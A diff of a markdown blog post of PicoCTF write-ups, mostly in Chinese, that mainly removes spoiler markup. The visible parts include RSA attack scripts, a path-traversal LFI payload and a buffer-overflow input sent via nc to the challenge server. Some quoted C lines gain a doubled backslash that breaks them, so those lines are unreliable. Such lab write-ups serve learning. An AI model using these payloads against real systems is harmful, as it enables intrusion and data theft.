@@ -8,7 +8,6 @@ date: 2024-01-31
 
 # PicoCTF - Easy Peasy Or Bad Questions
 <!-- more -->
-[TOC]
 
 ## Challenge: [logon](https://play.picoctf.org/practice/challenge/46?category=1&page=1)🍰
 
@@ -71,10 +70,10 @@ ffffffff820adb46 t pico_router_probe
 ## Challenge: [The Numbers](https://play.picoctf.org/practice?category=2&page=1)🍰
 
 ### Exploit - Alphabetic Sequence
-A $\to$ 1
-B $\to$ 2
+A → 1
+B → 2
 ...
-Z $\to$ 26
+Z → 26
 Flag: `PICOCTF{THENUMBERSMASNO}`
 
 ---
@@ -85,7 +84,6 @@ Very similar to [Dachshund Attacks](https://hackmd.io/@SBK6401/Bk7LEmGwn)
 [(5)低解密指數攻擊](https://zhuanlan.zhihu.com/p/76228394)
 
 ### Exploit - Large `e` in RSA
-:::spoiler Exploit Script
 ```python
 import gmpy2
 from Crypto.PublicKey import RSA
@@ -120,14 +118,12 @@ def main():
 if __name__=="__main__":
     main()
 ```
-:::
 
 ---
 
 ## Challenge: Sum-O-Primes🍰
 
 ### Source Code
-:::spoiler Source Code
 ```python
 #!/usr/bin/python
 
@@ -168,11 +164,11 @@ print(f'n = {n:x}')
 print(f'c = {c:x}')
 
 ```
-:::
 
 ### Exploit - Easy
 題目給了$x=p+q$，而我們的目標是求出$(p-1)*(q-1)=pq-p-q+1=n-x+1$
-:::spoiler Exploit Script
+
+Exploit Script
 ```python
 from Crypto.Util.number import inverse, long_to_bytes
 
@@ -186,7 +182,6 @@ d = inverse(e, phi)
 
 print(long_to_bytes(pow(c, d, n)))
 ```
-:::
 
 ---
 
@@ -195,6 +190,7 @@ print(long_to_bytes(pow(c, d, n)))
 ### Recon
 * Description: Why use p and q when I can use more?
 * Hint: There's more prime factors than p and q, finding d is going to be different.
+
 和[這題](https://hackmd.io/@SBK6401/HyTTXZnPh)幾乎一樣
 
 ### Exploit - Smooth Value
@@ -246,7 +242,7 @@ Flag: `picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}`
 
 ### Exploit - Reverse Script
 一開始先recon一下，我用burp抓了一下packet，發現他是把密碼在local端做驗證，所以要做的就只是要有耐心的分析一下source code
-:::spoiler Source Code
+
 ```javascript
 <html>
 <head>
@@ -310,7 +306,6 @@ Flag: `picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}`
 </html>
 
 ```
-:::
 
 Flag: `picoCTF{not_this_again_ef49bf}`
 
@@ -323,8 +318,8 @@ Description:
 ### Exploit - Easy LFI
 ![](https://hackmd.io/_uploads/HyYkIrJO2.png)
 
-Payload: `filename=../../../../flag.txt&read=`
-Flag: `picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}`
+* Payload: `filename=../../../../flag.txt&read=`
+* Flag: `picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}`
 
 
 ---
@@ -332,7 +327,7 @@ Flag: `picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}`
 ## Challenge: keygenme🍰
 
 ### Source
-:::spoiler IDA Main Function
+IDA Main Function
 ```cpp
 __int64 __fastcall main(int a1, char **a2, char **a3)
 {
@@ -349,8 +344,8 @@ __int64 __fastcall main(int a1, char **a2, char **a3)
   return 0LL;
 }
 ```
-:::
-:::spoiler IDA Check Flag Function
+
+IDA Check Flag Function
 ```cpp
 __int64 __fastcall check_key(const char *input_key)
 {
@@ -406,7 +401,6 @@ __int64 __fastcall check_key(const char *input_key)
   return 1LL;
 }
 ```
-:::
 
 ### Exploit
 直接動態跑到最後看memory就會知道key是`picoCTF{br1ng_y0ur_0wn_k3y_19836cd8}`
@@ -421,7 +415,6 @@ __int64 __fastcall check_key(const char *input_key)
 [strtol - c](https://www.runoob.com/cprogramming/c-function-strtol.html)
 
 ### Source Code
-:::spoiler Source Code
 ```cpp
 #include <stdio.h>
 #include <stdlib.h>
@@ -487,7 +480,7 @@ int tgetinput(char *input, unsigned int l)
         read_bytes = read(0, input, l-1);
         if(input[read_bytes-1]=='\n'){
         --read_bytes;
-        input[read_bytes]='\0';
+        input[read_bytes]='\\0';
         }
         if(read_bytes==0){
             printf("No data given.\n");
@@ -554,7 +547,7 @@ static void data_read() {
   char output[100];
   int r;
 
-  memset(output, '\0', 100);
+  memset(output, '\\0', 100);
   
   printf("Please enter the entry number of your data:\n");
   r = tgetinput(entry, 4);
@@ -578,7 +571,7 @@ static void data_read() {
 
 
 int main(int argc, char** argv) {
-  char input[3] = {'\0'};
+  char input[3] = {'\\0'};
   long command;
   int r;
 
@@ -620,14 +613,13 @@ int main(int argc, char** argv) {
 }
 
 ```
-:::
 
 ### Recon
 這一題感覺真的不像PWN題，比較像是reverse
 1. 注意讀取flag的地方是在`data_read()`的地方，且entry要是零
-我一開始的想法是往回推，所以要進到`data_read()`一開始的input就要選`2`，但會得到`No data yet`的結果，原因是input變數還是零(一開始的global variable有定義initia l value)
-2. 所以現在必須要想如何才能改變input variable的變數，答案就是`data_write()`，當寫入字串成功時會在這個function的最後給予一個entry，其實就是`input++`得來的，所以我們要做的事情就是
-先寫任意的數值的database $\to$ 進入`data_read()`讀取entry 0的data
+
+    我一開始的想法是往回推，所以要進到`data_read()`一開始的input就要選`2`，但會得到`No data yet`的結果，原因是input變數還是零(一開始的global variable有定義initia l value)
+2. 所以現在必須要想如何才能改變input variable的變數，答案就是`data_write()`，當寫入字串成功時會在這個function的最後給予一個entry，其實就是`input++`得來的，所以我們要做的事情就是先寫任意的數值的database → 進入`data_read()`讀取entry 0的data
 
 ### Exploit - Reverse Carefully
 ```bash
@@ -659,7 +651,6 @@ picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}
 ## Challenge: buffer overflow 0🍰
 
 ### Source Code
-:::spoiler Source Code
 ```cpp
 #include <stdio.h>
 #include <stdlib.h>
@@ -706,7 +697,6 @@ int main(int argc, char **argv){
   return 0;
 }
 ```
-:::
 
 ### Recon
 這一題比想像中簡單，算是給新手認識BoF的機會，可以看到source code中寫到只要觸發segmentation fault就會轉給`sigsegv_handler`這個function把flag印出來，而會遇到segmentation fault的地方就是第18行的strcpy function，只要給的input length大於buf2就會產生
@@ -751,7 +741,6 @@ Flag: `picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`
 (23/8/4)更新:打windows的題目要把new line改成\r\n，所以才會沒有成功
 
 ### Exploit
-:::spoiler
 ```bash
 $ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0\x15@\x00" | nc saturn.picoctf.net 50417
 Give me a string!
@@ -797,7 +786,7 @@ System information:
     Host system: Linux
     Host version: 5.19.0-1024-aws
 ```
-:::
+
 (23/8/4)更新:New Exploit
 ```python
 from pwn import *
@@ -929,5 +918,3 @@ picoCTF{honey.roasted.peanuts}
 ```
 
 Flag: `picoCTF{honey.roasted.peanuts}`
-
----
